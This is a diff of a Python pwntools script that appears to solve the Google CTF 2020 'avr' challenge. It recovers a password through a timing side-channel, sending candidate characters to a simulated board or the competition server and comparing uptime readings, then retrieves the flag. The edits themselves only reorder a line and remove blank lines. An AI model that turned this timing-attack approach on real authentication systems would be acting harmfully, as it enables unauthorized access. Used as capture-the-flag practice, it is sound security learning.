@@ -3,13 +3,12 @@ from time import sleep
 from subprocess import run
 from pwn import remote, process, context
 
+context.log_level = "ERROR"  # "DEBUG"
+
 LOCAL_PROC_ARGS = [
     "simavr/examples/board_simduino/obj-x86_64-linux-gnu/simduino.elf", "code.hex"]
 REMOTE_HOST = "avr.2020.ctfcompetition.com"
 REMOTE_PORT = 1337
-
-context.log_level = "ERROR"  # "DEBUG"
-
 
 def main():
     password, password_solved = "", False
@@ -34,7 +33,6 @@ def main():
         num_pads += 1
     print(f"Flag: {flag}")
 
-
 def timing_attack_next_char(curr_password):
     baseline_times = gen_baseline_times(curr_password)
     msg = "\n"
@@ -57,7 +55,6 @@ def timing_attack_next_char(curr_password):
     io.close()
     return char, password_solved
 
-
 def gen_baseline_times(curr_password):
     msg = "\n" + f"agent\n{curr_password}\x7f\n" * (0x7f - 0x21)
     io = connect()
@@ -71,7 +68,6 @@ def gen_baseline_times(curr_password):
     io.close()
     return times
 
-
 def connect():
     if args.remote:
         io = remote(REMOTE_HOST, REMOTE_PORT)
@@ -82,28 +78,23 @@ def connect():
     io.recvuntil("Press ENTER to continue.\n")
     return io
 
-
 def get_uptime(io):
     io.recvuntil("Uptime: ")
     return int(io.recvline()[:-3])
-
 
 def get_attempt_output(io):
     io.recvuntil("Password: ")
     return io.recvline()
 
-
 def get_post_login_timer_status(io):
     io.recvuntil("Access granted.\n")
     return io.recvline()
-
 
 def get_flag(io):
     sleep(7)
     io.sendline("2")
     io.recvuntil("FLAG IS ")
     return io.recvline()[:-2]
-
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
